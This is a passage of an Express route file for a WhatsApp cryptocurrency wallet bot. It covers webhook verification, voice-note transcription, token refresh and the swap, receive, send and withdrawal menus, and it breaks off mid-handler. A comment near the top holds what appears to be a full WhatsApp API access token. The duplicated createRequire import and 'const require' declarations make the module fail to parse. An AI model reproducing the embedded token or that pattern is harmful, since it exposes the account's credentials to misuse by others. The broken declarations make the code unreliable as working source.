import express from "express";
import { getSession, updateSession } from "../services/session.service.js";
import {
  createUserOnboarding,
  notifyOnboardingStageStarted,
} from "../services/onboarding.service.js";
import { verifyNIN } from "../services/kyc.service.js";
import { verifyBVN } from "../services/bvn.service.js";
import {
  loginUser,
  checkPhoneNumber,
  restoreCachedToken,
  refreshAccessToken,
  isSessionTokenValid,
} from "../services/auth.service.js";
import { fetchAuthMe } from "../services/user.service.js";
import { depositCrypto } from "../services/deposit.service.js";
import { fetchWalletBalances } from "../services/wallet.service.js";
import { fetchReceiveWallets } from "../services/recieve.service.js";
import { humanizeError } from "../services/ai.service.js";
import { resolveIntent } from "../ai/intentRouter.js";
import {
  describeFlowState,
  clearedFlowState,
  voiceAllowed,
} from "../ai/flowState.js";
import {
  fetchSwapCurrencies,
  fetchSwapQuote,
  executeSwap,
} from "../services/swap.service.js";
import {
  fetchWithdrawalQuote,
  fetchBanks,
  validateBankAccount,
  executeWithdrawal,
  fetchSupportedCountries,
  fetchPaymentChannels,
} from "../services/withdrawal.service.js";
import { confirmPayment } from "../services/confirmPayment.service.js";
import {
  fetchSendSupportedCurrencies,
  executeSendCrypto,
} from "../services/send.service.js";

import { fetchRates } from "../services/rates.service.js";
import {
  requestChangePinOtp,
  changePinRequest,
  lockWallet,
  unlockWallet,
} from "../services/changePin.service.js";
import logger from "../lib/logger.js";

import { decryptRequest, encryptResponse } from "../utils/decrypt.js";

import {
  resolveCurrencies,
  readCoin,
  normalizeCoins,
} from "../utils/apiShape.js";
import { verifyMetaSignature } from "../utils/verifySignature.js";
import { markMessageSeen } from "../utils/messageDedup.js";
import {
  downloadWhatsAppMedia,
  SLOW_TRANSCRIBE_BYTES,
} from "../utils/whatsappMedia.js";
import { transcribeAudio } from "../services/transcription.service.js";
import { normalizeSpokenText } from "../utils/spokenNumbers.js";
import { createRequire } from "module";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const require = createRequire(import.meta.url);

const router = express.Router();

// Environment configuration (Replace with environment variables in production)
// const WHATSAPP_TOKEN =
//   "EAAj9wlKZBT6ABR0ZA7xB1T7Y4ZCi81c6ZCfu0v9KKngj3rixlkkq2JLtZCIYCprLk0nnJ1tsq02sRSbSZAzZBWVEPF7ueXzZAALOKTnNB6VqOr1TAp3sKvxq14FLRSlG2kaKQpM1poznqrOnxn3blZCq7bBZBOivfN0bLXFRwnGBZBHRcOf2ltnG8oBCbNN4vjQAh8MkcGZC2ZBRLVrp2OwKJ4BBCbGDrdAf6NvNMz5DJMr4WZAfX3ZC892ZAbFr9hZCMTaSmJvCDpn1kGWBkdfwQpZCXa3ZBxM0gZDZD";
const WHATSAPP_TOKEN = process.env.WHATSAPP_TOKEN;
const VERIFY_TOKEN = process.env.WHATSAPP_VERIFY_TOKEN;
// const FLOW_ID = "1554499149728842";
// const PIN_FLOW_ID = "1571906007827358";
// const NIN_FLOW_ID = "1520332329637155";
// const BVN_FLOW_ID = "1638175827290848";
const WHATSAPP_API_VERSION = "v25.0";

const FLOW_ID = process.env.FLOW_ID;
const PIN_FLOW_ID = process.env.PIN_FLOW_ID;
const NIN_FLOW_ID = process.env.NIN_FLOW_ID;
const BVN_FLOW_ID = process.env.BVN_FLOW_ID;
const BANK_SELECTION_FLOW_ID = process.env.BANK_SELECTION_FLOW_ID;
const COUNTRY_SELECTION_FLOW_ID = process.env.COUNTRY_SELECTION_FLOW_ID;
const ITEM_SELECTION_FLOW_ID = process.env.ITEM_SELECTION_FLOW_ID;

function formatDobToISO(dob) {
  if (!dob) return null;

  // If already ISO, return as-is
  if (!isNaN(Date.parse(dob))) {
    return new Date(dob).toISOString();
  }

  // If format is YYYY-MM-DD (Flow date picker)
  const isoCandidate = `${dob}T00:00:00.000Z`;
  return new Date(isoCandidate).toISOString();
}

function normalizePhone(phone) {
  if (!phone) return phone;

  // If already has +, return as-is
  if (phone.startsWith("+")) {
    return phone;
  }

  // WhatsApp sends Nigerian numbers as 234XXXXXXXXXX
  if (phone.startsWith("234")) {
    return `+${phone}`;
  }

  // Fallback (just in case)
  return `+${phone}`;
}

const PREFERRED_COINS = [
  "BTC",
  "ETH",
  "USDT",
  "USDC",
  "BNB",
  "XRP",
  "SOL",
  "TRX",
  "DOGE",
  "ADA",
  "AVAX",
  "DOT",
  "LINK",
  "TON",
  "NEAR",
  "SUI",
  "MATIC",
  "LTC",
  "BCH",
  "UNI",
];

// NOTE: these used to assume `allCurrencies` was always an array, and that
// every item keyed its ticker as `coin`. When either assumption failed,
// `.find()` threw a TypeError that only the route's outermost catch saw — so
// the user got "Sure, let me take you there!" and then nothing at all.
// readCoin() tolerates the field-name variation; the callers resolve the list
// itself via resolveCurrencies() so the real shape gets logged.
function pickPreferredCoins(allCurrencies, preferredList) {
  if (!Array.isArray(allCurrencies)) return [];
  return preferredList
    .map((symbol) => allCurrencies.find((c) => readCoin(c) === symbol))
    .filter(Boolean); // pagination handles the 10-item limit now
}

function pickPreferredToCoins(allCurrencies, preferredList, fromCoin) {
  if (!Array.isArray(allCurrencies)) return [];
  return preferredList
    .filter((symbol) => symbol !== fromCoin)
    .map((symbol) => allCurrencies.find((c) => readCoin(c) === symbol))
    .filter(Boolean); // pagination handles the 10-item limit now
}

/**
 * Shared entry for every swap-currency lookup. There are three call sites
 * (main menu, routeToFlow, and the to-coin step) that had drifted into
 * near-duplicates with different guards; this keeps them honest.
 *
 * @returns {{ coins: any[], error: string|null }}
 */
async function loadSwapCoins(fromCoin) {
  const res = await fetchSwapCurrencies();

  if (!res.success) {
    console.error(
      "loadSwapCoins: API call failed —",
      JSON.stringify(res.error)?.slice(0, 300),
    );
    return {
      coins: [],
      error:
        "⚠️ Unable to load swap currencies right now. Please try again in a moment.",
    };
  }

  const { list, reason } = resolveCurrencies(res.data, "swap/currencies");

  if (reason) {
    return {
      coins: [],
      error: "⚠️ Swap isn't available right now. Please try again shortly.",
    };
  }

  // Normalise before filtering so downstream `c.coin` reads always work.
  const normalized = normalizeCoins(list);

  const coins = fromCoin
    ? pickPreferredToCoins(normalized, PREFERRED_COINS, fromCoin)
    : pickPreferredCoins(normalized, PREFERRED_COINS);

  if (!coins.length) {
    console.error(
      `loadSwapCoins: ${list.length} currencies returned but none matched PREFERRED_COINS.`,
      "available =",
      list.map(readCoin).filter(Boolean).slice(0, 30).join(", "),
      "| preferred =",
      PREFERRED_COINS.join(", "),
    );
    return {
      coins: [],
      error: "⚠️ Swap isn't available right now. Please try again shortly.",
    };
  }

  return { coins, error: null };
}

// function isFreeText(msg, session) {
//   if (msg.type !== "text") return false;
//   if (session.data?.expectedInput) return false;
//   return true;
// }

/* ------------- verification for Meta webhook ------------- */
router.get("/callback", (req, res) => {
  const mode = req.query["hub.mode"];
  const token = req.query["hub.verify_token"];
  const challenge = req.query["hub.challenge"];
  if (mode === "subscribe" && token === VERIFY_TOKEN) {
    return res.status(200).send(challenge);
  }
  return res.sendStatus(403);
});

/* ------------- main webhook for incoming WhatsApp events (FIXED FOR FLOW SUBMISSION) ------------- */
router.post("/callback", async (req, res) => {
  // Reject anything Meta did not sign, BEFORE acknowledging or processing.
  // No-op until WHATSAPP_APP_SECRET is configured — see verifySignature.js.
  const signature = verifyMetaSignature(req);
  if (!signature.ok) {
    console.error(
      `Rejected unsigned webhook: ${signature.reason} (from ${req.ip})`,
    );
    logger.warn("webhook.rejected", { reason: signature.reason, ip: req.ip });
    return res.sendStatus(403);
  }

  console.log("webhook hit successfully");
  logger.info("Webhook hit");
  // Acknowledge immediately to Meta
  res.sendStatus(200);

  try {
    // console.log("WEBHOOK ARRIVED:", JSON.stringify(req.body, null, 2));

    const entries = req.body.entry || [];
    for (const entry of entries) {
      const changes = entry.changes || [];
      for (const change of changes) {
        const value = change.value || {};
        const phone_number_id = value.metadata?.phone_number_id;

        // Ignore status updates
        if (value.statuses?.length > 0) {
          console.log("Status update received — ignoring");
          logger.debug("Status update received, ignoring");
          continue;
        }

        const messages = value.messages || [];
        for (const msg of messages) {
          const rawFrom = msg.from;
          if (!rawFrom) continue;

          const from = normalizePhone(rawFrom);
          if (!from) continue;

          // Meta redelivers webhooks it did not get a prompt 200 for — which
          // is every message that arrived while the container was down. Without
          // this, each redelivery replays the whole handler and the user gets
          // the same replies over and over, unprompted.
          if (!markMessageSeen(msg.id)) {
            console.log(`Duplicate message ${msg.id} from ${from} — skipping`);
            logger.info("webhook.duplicate", { messageId: msg.id });
            continue;
          }

          // Store phone_number_id in session for later replies
          let session = await getSession(from);
          await updateSession(from, {
            data: { ...(session.data || {}), phone_number_id },
          });

          restoreCachedToken(session.data);
          session = await getSession(from);

          // ── VOICE NOTES ────────────────────────────────────────────
          // Transcribe and rewrite into a text message so the entire
          // state machine below runs unchanged.
          if (msg.type === "audio" || msg.type === "voice") {
            if (!session.data?.authenticated) {
              await sendWhatsApp(
                from,
                "👋 Please sign in first — send me a text message to get started.",
                phone_number_id,
              );
              continue;
            }

            const preState = describeFlowState(session.data);

            if (process.env.VIXA_VOICE_ENABLED === "false") {
              await sendWhatsApp(
                from,
                "🎤 Voice notes aren't available right now — please type your message.",
                phone_number_id,
              );
              continue;
            }

            // STATE CHECK FIRST — before any bytes leave this process. A
            // user who speaks their PIN must not have it uploaded for
            // transcription.
            if (!voiceAllowed(preState)) {
              await sendWhatsApp(
                from,
                preState.sealed
                  ? "🔒 For your security I can't accept voice notes here — please type it in."
                  : "🔒 This one needs to be typed so we get it exactly right.",
                phone_number_id,
              );
              if (preState.rePrompt) {
                await sendWhatsApp(from, preState.rePrompt, phone_number_id);
              }
              logger.info("voice.refused", {
                messageId: msg.id,
                flow: preState.flow,
                step: preState.step,
                sealed: preState.sealed,
              });
              continue;
            }

            const mediaId = msg.audio?.id || msg.voice?.id;
            const media = await downloadWhatsAppMedia(mediaId);

            if (!media) {
              await sendWhatsApp(
                from,
                "⚠️ I couldn't open that voice note. Please try again, or type your message.",
                phone_number_id,
              );
              continue;
            }

            // duration isn't in Meta's payload; file size is the proxy.
            if (media.fileSize > SLOW_TRANSCRIBE_BYTES) {
              await sendWhatsApp(
                from,
                "🎧 One sec, listening...",
                phone_number_id,
              );
            }

            const t = await transcribeAudio(media);

            if (!t.success) {
              await sendWhatsApp(
                from,
                "🎧 Sorry, I couldn't make that out. Please try again, or type it.",
                phone_number_id,
              );
              logger.warn?.("voice.failed", {
                messageId: msg.id,
                reason: t.reason,
              });
              continue;
            }

            const spoken = normalizeSpokenText(t.text);
            console.log(`[voice] ${from}: "${t.text}" → "${spoken}"`);
            logger.info("voice.transcribed", {
              messageId: msg.id,
              flow: preState.flow,
              step: preState.step,
              chars: spoken.length,
            });

            // Rewrite. Everything downstream is untouched.
            msg.type = "text";
            msg.text = { body: spoken };
            msg._fromVoice = true;
          }

          // A Flow submission carries the PIN itself, so interrupting it to
          // ask for a PIN would be circular — it stays excluded from the
          // token check below.
          const isFlowReply =
            msg.type === "interactive" && msg.interactive?.type === "nfm_reply";

          // Button and list taps were ALSO excluded here, which meant every
          // interactive handler that calls the API — country select, bank
          // select, balance, swap, send — ran with whatever token was in the
          // session, expired or not. A dead token came back as a 401 and got
          // reported to the user as "No payment channels available for this
          // country", which looks like a data problem and isn't. They need a
          // live token exactly as much as a typed message does.
          if (
            !isFlowReply &&
            session.data?.authenticated &&
            !isSessionTokenValid(session.data)
          ) {
            if (!session.data?.awaitingPin) {
              console.log(
                `Token expired for ${from}. Attempting silent refresh...`,
              );

              const refreshTokenStillValid = session.data?.refreshTokenExpiresAt
                ? Date.now() < session.data.refreshTokenExpiresAt
                : !!session.data?.refreshToken;

              if (session.data?.refreshToken && refreshTokenStillValid) {
                const refreshResult = await refreshAccessToken({
                  phoneNumber: from,
                  refreshToken: session.data.refreshToken,
                });

                if (refreshResult.success) {
                  console.log(
                    `Silent refresh succeeded for ${from}. Continuing.`,
                  );
                  session = await getSession(from);
                  restoreCachedToken(session.data);
                  // fall through to normal message processing
                } else {
                  console.log(
                    `Silent refresh failed for ${from}. Requesting PIN.`,
                  );

                  // Remember which flow they were in so login can put them
                  // back. Sealed steps are skipped — the PIN Flow already
                  // routes those correctly on its own.
                  const dyingState = describeFlowState(session.data);
                  const resume =
                    dyingState.active && !dyingState.sealed
                      ? { flow: dyingState.flow, at: Date.now() }
                      : null;

                  await updateSession(from, {
                    data: {
                      ...session.data,
                      authenticated: false,
                      awaitingPin: true,
                      pinAttempts: 0,
                      pendingResume: resume,
                      pendingDeposit: false,
                      awaitingDepositConfirmation: false,
                      awaitingDepositPin: false,
                      swap: null,
                      send: null,
                      withdraw: null,
                      receive: null,
                    },
                  });
                  await triggerPinFlow(from, phone_number_id, "LOGIN");
                  continue;
                }
              } else {
                console.log(
                  `No valid refresh token for ${from}. Requesting PIN.`,
                );

                // Same capture as the refresh-failed branch above.
                const dyingState = describeFlowState(session.data);
                const resume =
                  dyingState.active && !dyingState.sealed
                    ? { flow: dyingState.flow, at: Date.now() }
                    : null;

                await updateSession(from, {
                  data: {
                    ...session.data,
                    authenticated: false,
                    awaitingPin: true,
                    pinAttempts: 0,
                    pendingResume: resume,
                    pendingDeposit: false,
                    awaitingDepositConfirmation: false,
                    awaitingDepositPin: false,
                    swap: null,
                    send: null,
                    withdraw: null,
                    receive: null,
                  },
                });
                await triggerPinFlow(from, phone_number_id, "LOGIN");
                continue;
              }
            }
          }

          // --- FIX: Detect and process Flow Submission (nfm_reply) ---
          if (
            msg.type === "interactive" &&
            msg.interactive?.type === "nfm_reply"
          ) {
            console.log("Flow submission (nfm_reply) received. Processing...");
            const responseJson = msg.interactive.nfm_reply.response_json;
            const flowData = JSON.parse(responseJson);

            // Hand off the raw, parsed Flow data to the dedicated processing function
            await processFlowCompletion(from, phone_number_id, flowData);
            continue;
          }

          // --- HANDLE LIST MENU SELECTIONS ---
          if (
            msg.type === "interactive" &&
            msg.interactive?.type === "list_reply"
          ) {
            const actionId = msg.interactive.list_reply.id;

            console.log("Menu selection:", actionId);

            // SWAP FROM pagination
            if (actionId.startsWith("SWAP_FROM_PAGE_")) {
              const nextPage = parseInt(
                actionId.replace("SWAP_FROM_PAGE_", ""),
                10,
              );
              const coinsList = session.data?.swap?.allCoins || [];

              if (!coinsList.length) {
                await sendWhatsApp(
                  from,
                  "⚠️ Session expired. Please start over.",
                  phone_number_id,
                );
                await sendMainMenu(from, phone_number_id);
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  swap: { ...session.data.swap, currentFromPage: nextPage },
                },
              });

              await sendPaginatedSwapCoinsMenu(
                from,
                phone_number_id,
                coinsList,
                nextPage,
                "FROM",
              );
              return;
            }

            // SWAP TO pagination
            if (actionId.startsWith("SWAP_TO_PAGE_")) {
              const nextPage = parseInt(
                actionId.replace("SWAP_TO_PAGE_", ""),
                10,
              );
              const toCoins = session.data?.swap?.toCoins || [];

              if (!toCoins.length) {
                await sendWhatsApp(
                  from,
                  "⚠️ Session expired. Please start over.",
                  phone_number_id,
                );
                await sendMainMenu(from, phone_number_id);
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  swap: { ...session.data.swap, currentToPage: nextPage },
                },
              });

              await sendPaginatedSwapCoinsMenu(
                from,
                phone_number_id,
                toCoins,
                nextPage,
                "TO",
              );
              return;
            }

            if (actionId.startsWith("SWAP_FROM_")) {
              const coin = actionId.replace("SWAP_FROM_", "");
              const selected = session.data.swap.allCoins.find(
                (c) => c.coin === coin,
              );

              if (!selected) {
                await sendWhatsApp(
                  from,
                  "⚠️ Coin not found. Please start over.",
                  phone_number_id,
                );
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  swap: {
                    ...session.data.swap,
                    step: "ENTER_AMOUNT",
                    fromCoin: coin,
                    fromCoinLimits: selected,
                  },
                },
              });

              await sendWhatsApp(
                from,
                `💰 Enter amount of *${coin}* to swap\n\nMin: ${selected.minAmount}\nMax: ${selected.maxAmount}`,
                phone_number_id,
              );

              return;
            }

            if (actionId.startsWith("SWAP_TO_")) {
              const toCoin = actionId.replace("SWAP_TO_", "");
              const toLimits = session.data.swap.toCoins.find(
                (c) => c.coin === toCoin,
              );
              const { amount } = session.data.swap;

              // // 🔴 CRITICAL RULE
              // if (amount < toLimits.minAmount || amount > toLimits.maxAmount) {
              //   await sendWhatsApp(
              //     from,
              //     `❌ Amount not supported for ${toCoin}. Range: ${toLimits.minAmount} - ${toLimits.maxAmount}`,
              //     phone_number_id,
              //   );
              //   return;
              // }

              const quote = await fetchSwapQuote({
                fromCoin: session.data.swap.fromCoin,
                toCoin,
                fromAmount: amount,
              });

              console.log(quote, "qouteres");

              if (!quote.success) {
                const rawError = quote.error?.message || "Unknown server error";
                const friendlyMessage = await humanizeError(
                  rawError,
                  "get a swap quote",
                );
                await sendWhatsApp(from, friendlyMessage, phone_number_id);
                return;
              }

              // await sendWhatsApp(
              //   from,
              //   `🔄 *Swap Quote*\n\nFrom: ${amount} ${session.data.swap.fromCoin}\nTo: ${quote.data.data.toAmount} ${toCoin}\nFee: ${quote.data.data.fee}`,
              //   phone_number_id,
              // );

              await updateSession(from, {
                data: {
                  ...session.data,
                  swap: {
                    ...session.data.swap,
                    step: "AWAITING_SWAP_PIN",
                    toCoin,
                    quote: quote.data.data,
                  },
                },
              });

              await sendWhatsApp(
                from,
                `🔄 *Swap Ready*\n\n` +
                  `From: ${amount} ${session.data.swap.fromCoin}\n` +
                  `To: ${quote.data.data.toAmount} ${toCoin}\n` +
                  `Fee: ${quote.data.data.fee}\n\n` +
                  `🔐 Please enter your *PIN* to authorize this swap.`,
                phone_number_id,
              );
              await triggerPinFlow(from, phone_number_id, "SWAP");
              return;
            }

            if (actionId.startsWith("RECEIVE_COIN_")) {
              const coin = actionId.replace("RECEIVE_COIN_", "");

              const walletsRes = await fetchReceiveWallets({ coin });

              if (!walletsRes.success) {
                await sendWhatsApp(
                  from,
                  "⚠️ Unable to load receive wallets.",
                  phone_number_id,
                );
                return;
              }

              const wallets = walletsRes?.data?.data?.data || [];

              if (!wallets.length) {
                await sendWhatsApp(
                  from,
                  `⚠️ No receive wallets available for ${coin}.`,
                  phone_number_id,
                );
                return;
              }

              // ✅ If only ONE wallet → show address directly
              if (wallets.length === 1) {
                const w = wallets[0];

                await sendWhatsApp(
                  from,
                  `📥 *${w.coin} Receive Address*\n\n` +
                    `Network: ${w.network}\n` +
                    `Chain: ${w.chain}\n\n` +
                    `📌 *Tap & hold to copy address:*\n` +
                    `\`\`\`\n${w.address}\n\`\`\``,
                  phone_number_id,
                );

                await sendMainMenu(from, phone_number_id);
                return;
              }

              // ✅ Multiple chains → show selection menu
              const rows = wallets.slice(0, 10).map((w) => ({
                id: `RECEIVE_WALLET_${w.id}`,
                title: `${w.chain}`,
                description: `${w.network}`,
              }));

              await updateSession(from, {
                data: {
                  ...session.data,
                  receive: {
                    step: "SELECT_CHAIN",
                    wallets,
                    selectedCoin: coin,
                  },
                },
              });

              await sendWhatsApp(
                from,
                {
                  type: "interactive",
                  interactive: {
                    type: "list",
                    body: { text: `📥 Select ${coin} network` },
                    action: {
                      button: "Select network",
                      sections: [{ title: "Available Networks", rows }],
                    },
                  },
                },
                phone_number_id,
              );

              return;
            }

            if (actionId.startsWith("RECEIVE_WALLET_")) {
              const walletId = actionId.replace("RECEIVE_WALLET_", "");

              const wallet = session.data?.receive?.wallets?.find(
                (w) => w.id === walletId,
              );

              if (!wallet) {
                await sendWhatsApp(
                  from,
                  "⚠️ Wallet not found.",
                  phone_number_id,
                );
                return;
              }

              await sendWhatsApp(
                from,
                `📥 *${wallet.coin} Receive Address*\n\n` +
                  `Network: ${wallet.network}\n` +
                  `Chain: ${wallet.chain}\n\n` +
                  `📌 *Tap & hold to copy address:*\n` +
                  `\`\`\`\n${wallet.address}\n\`\`\``,
                phone_number_id,
              );

              // reset receive state
              await updateSession(from, {
                data: {
                  ...session.data,
                  receive: null,
                },
              });

              await sendMainMenu(from, phone_number_id);
              return;
            }

            // 🆕 PAGINATION INTERCEPTOR: Catch "See More" clicks first
            if (actionId === "WITHDRAW_COUNTRY_NEXT_PAGE") {
              // 1. Calculate the next page number
              const nextPage = (session.data.withdraw?.currentPage || 0) + 1;
              const fullList = session.data.withdraw?.countriesList || [];

              if (fullList.length === 0) {
                await sendWhatsApp(
                  from,
                  "⚠️ Session expired. Please start over.",
                  phone_number_id,
                );
                await sendMainMenu(from, phone_number_id);
                return;
              }

              // 2. Update the page number in session
              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: { ...session.data.withdraw, currentPage: nextPage },
                },
              });

              // 3. Send the next chunk
              await sendPaginatedCountriesMenu(
                from,
                phone_number_id,
                fullList,
                nextPage,
              );
              return;
            }

            // 🆕 SPECIFIC COUNTRY SELECTION HANDLER
            if (actionId.startsWith("WITHDRAW_COUNTRY_")) {
              const countryCode = actionId.replace("WITHDRAW_COUNTRY_", "");

              // await sendWhatsApp(
              //   from,
              //   "⏳ Loading payment channels...",
              //   phone_number_id,
              // );

              // 1. Fetch channels dynamically for selected country
              const channelsRes = await fetchPaymentChannels(
                countryCode,
                "withdraw",
              );
              console.log(countryCode, channelsRes, "channelsRes");
              if (!channelsRes.success || !channelsRes.data?.items?.length) {
                await sendWhatsApp(
                  from,
                  "⚠️ No payment channels available for this country currently.",
                  phone_number_id,
                );
                return;
              }

              // 2. Grab the first channel ID
              const items = channelsRes.data.items;
              const momoChannel = items.find(
                (c) => c.channelType?.toLowerCase() === "momo",
              );
              const selectedChannel = momoChannel || items[0];

              console.log(
                `Selected channel for ${countryCode}:`,
                selectedChannel.id,
                selectedChannel.channelType,
              );

              // 3. Save both to session
              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    countryCode,
                    channelId: selectedChannel.id,
                    step: "SELECT_WITHDRAW_TYPE",
                  },
                },
              });

              await sendWithdrawTypeMenu(from, phone_number_id);
              return;
            }

            if (actionId.startsWith("SEND_COIN_")) {
              const coin = actionId.replace("SEND_COIN_", "");

              const selectedCoin = session.data?.send?.coins?.find(
                (c) => c.coin === coin,
              );

              if (!selectedCoin) {
                await sendWhatsApp(from, "⚠️ Coin not found.", phone_number_id);
                return;
              }

              if (session.data.send.type === "P2P") {
                await updateSession(from, {
                  data: {
                    ...session.data,
                    send: {
                      ...session.data.send,
                      coin,
                      chain: null, // No chain needed for P2P
                      step: "ENTER_AMOUNT",
                    },
                  },
                });
                await sendWhatsApp(
                  from,
                  `💸 Enter amount of *${coin}* to send:`,
                  phone_number_id,
                );
                return; // STOP here
              }

              const chains = selectedCoin.chains || [];

              // Single chain → auto select
              if (chains.length === 1) {
                await updateSession(from, {
                  data: {
                    ...session.data,
                    send: {
                      ...session.data.send,
                      coin,
                      chain: chains[0],
                      step: "ENTER_AMOUNT",
                    },
                  },
                });

                await sendWhatsApp(
                  from,
                  `💸 Enter amount of *${coin}* to send\nMin: ${chains[0].minWithdrawAmount}`,
                  phone_number_id,
                );

                return;
              }

              // Multi-chain → list selection
              const rows = chains.slice(0, 10).map((ch) => ({
                id: `SEND_CHAIN_${ch.chain}`,
                title: ch.chain,
                description: `Min: ${ch.minWithdrawAmount}`,
              }));

              await updateSession(from, {
                data: {
                  ...session.data,
                  send: {
                    ...session.data.send,
                    coin,
                    chains,
                    step: "SELECT_CHAIN",
                  },
                },
              });

              await sendWhatsApp(
                from,
                {
                  type: "interactive",
                  interactive: {
                    type: "list",
                    body: { text: `📤 Select ${coin} network` },
                    action: {
                      button: "Select network",
                      sections: [{ title: "Available Networks", rows }],
                    },
                  },
                },
                phone_number_id,
              );

              return;
            }

            if (actionId.startsWith("SEND_CHAIN_")) {
              const chainName = actionId.replace("SEND_CHAIN_", "");

              const chain = session.data?.send?.chains?.find(
                (c) => c.chain === chainName,
              );

              if (!chain) {
                await sendWhatsApp(
                  from,
                  "⚠️ Network not found.",
                  phone_number_id,
                );
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  send: {
                    ...session.data.send,
                    chain,
                    step: "ENTER_AMOUNT",
                  },
                },
              });

              await sendWhatsApp(
                from,
                `💸 Enter amount of *${session.data.send.coin}* to send\nMin: ${chain.minWithdrawAmount}`,
                phone_number_id,
              );

              return;
            }

            if (
              actionId === "SEND_TYPE_P2P" ||
              actionId === "SEND_TYPE_EXTERNAL"
            ) {
              const type = actionId === "SEND_TYPE_P2P" ? "P2P" : "EXTERNAL";

              const coinsRes = await fetchSendSupportedCurrencies();

              if (!coinsRes.success) {
                // The reason was previously swallowed — log it so the next
                // occurrence is diagnosable from Seq rather than a screenshot.
                console.error(
                  "SEND: /crypto/supported-currencies failed —",
                  JSON.stringify(coinsRes.error)?.slice(0, 400),
                );
                await sendWhatsApp(
                  from,
                  "⚠️ Unable to load supported coins right now. Please try again shortly.",
                  phone_number_id,
                );
                return;
              }

              const { list: rawCoins, reason: coinsReason } = resolveCurrencies(
                coinsRes.data,
                "crypto/supported-currencies",
              );

              const coins = normalizeCoins(rawCoins);

              if (coinsReason || !coins.length) {
                await sendWhatsApp(
                  from,
                  "⚠️ No coins are available to send right now. Please try again shortly.",
                  phone_number_id,
                );
                return;
              }

              const uniqueCoins = Array.from(
                new Map(coins.map((c) => [c.coin, c])).values(),
              );

              await updateSession(from, {
                data: {
                  ...session.data,
                  send: { step: "SELECT_COIN", type, coins },
                },
              });

              await triggerItemSelectionFlow(from, phone_number_id, {
                context: "SEND_COIN",
                items: uniqueCoins.map((c) => ({
                  id: c.coin,
                  title: c.coin,
                  description:
                    type === "P2P"
                      ? "Send to Vixa user"
                      : `${c.chains?.length || 1} network(s)`,
                })),
                bodyText: "📤 Select the coin you want to send",
                heading: "Select coin to send",
                label: "Coin",
                cta: "Select Coin",
              });

              return;
            }
            // --- WITHDRAWAL: TYPE & COIN & BANK SELECTION ---
            if (actionId === "WITHDRAW_TYPE_USDT") {
              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    coin: "USDT",
                    step: "ENTER_AMOUNT",
                  },
                },
              });
              await sendWhatsApp(
                from,
                "💰 Please enter the amount of *USDT* you want to withdraw:",
                phone_number_id,
              );
              return;
            }

            if (actionId === "WITHDRAW_TYPE_OTHER") {
              const balances = await fetchWalletBalances();
              if (!balances || balances.length === 0) {
                await sendWhatsApp(
                  from,
                  "⚠️ You have no balances to withdraw.",
                  phone_number_id,
                );
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: { ...session.data.withdraw, step: "SELECT_COIN" },
                },
              });

              await triggerItemSelectionFlow(from, phone_number_id, {
                context: "WITHDRAW_COIN",
                items: balances.map((b) => ({
                  id: b.coin,
                  title: b.coin,
                  description: `Bal: ${b.balance}`,
                })),
                bodyText: "Select the coin you want to withdraw",
                heading: "Select a coin to withdraw",
                label: "Coin",
                cta: "Select Coin",
              });
              return;
            }

            if (actionId.startsWith("WITHDRAW_COIN_")) {
              const coin = actionId.replace("WITHDRAW_COIN_", "");
              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    coin,
                    step: "ENTER_AMOUNT",
                  },
                },
              });
              await sendWhatsApp(
                from,
                `💰 Please enter the amount of *${coin}* you want to withdraw:`,
                phone_number_id,
              );
              return;
            }

            // BANK pagination
            if (actionId === "WITHDRAW_BANK_NEXT_PAGE") {
              const nextPage =
                (session.data.withdraw?.currentBankPage || 0) + 1;
              const fullList = session.data.withdraw?.banks || [];

              if (!fullList.length) {
                await sendWhatsApp(
                  from,
                  "⚠️ Session expired. Please start over.",
                  phone_number_id,
                );
                await sendMainMenu(from, phone_number_id);
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    currentBankPage: nextPage,
                  },
                },
              });

              await sendPaginatedBanksMenu(
                from,
                phone_number_id,
                fullList,
                nextPage,
              );
              return;
            }

            if (actionId === "LOCK_WALLET") {
              await updateSession(from, {
                data: {
                  ...session.data,
                  lockWallet: { step: "ENTER_REASON" },
                },
              });
              await sendWhatsApp(
                from,
                "🔒 *Lock Wallet*\n\nPlease tell us the reason you want to lock your wallet:\n\n(e.g. Lost phone, Suspicious activity, Going on vacation)",
                phone_number_id,
              );
              return;
            }

            if (actionId === "UNLOCK_WALLET") {
              // Immediately request OTP before asking anything
              const otpRes = await requestChangePinOtp("UnlockWallet");

              if (!otpRes.success) {
                const friendly = await humanizeError(
                  otpRes.error?.message || "Unknown error",
                  "request an OTP to unlock wallet",
                );
                await sendWhatsApp(from, friendly, phone_number_id);
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  unlockWallet: { step: "ENTER_OTP" },
                },
              });

              await sendWhatsApp(
                from,
                "🔓 *Unlock Wallet*\n\nAn OTP has been sent to your Email Address.\n\nPlease type the OTP here to continue:",
                phone_number_id,
              );
              return;
            }

            if (actionId === "CHANGE_PIN") {
              await updateSession(from, {
                data: {
                  ...session.data,
                  changePin: { step: "ENTER_CURRENT_PIN" },
                },
              });
              await triggerPinFlow(
                from,
                phone_number_id,
                "CHANGE_PIN_CURRENT",
                "🔐 Enter your *current PIN* to begin the change:",
              );
              return;
            }

            if (actionId.startsWith("WITHDRAW_BANK_")) {
              const networkId = actionId.replace("WITHDRAW_BANK_", "");
              // Retrieve bank name from session cache
              const bankName =
                session.data.withdraw.banks.find((b) => b.id === networkId)
                  ?.name || "Selected Bank";

              const isNigeria = session.data.withdraw?.countryCode === "NG";

              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    networkId,
                    bankName,
                    step: isNigeria
                      ? "ENTER_ACCOUNT_NUMBER"
                      : "ENTER_ACCOUNT_NUMBER_OTHER",
                  },
                },
              });
              // await sendWhatsApp(
              //   from,
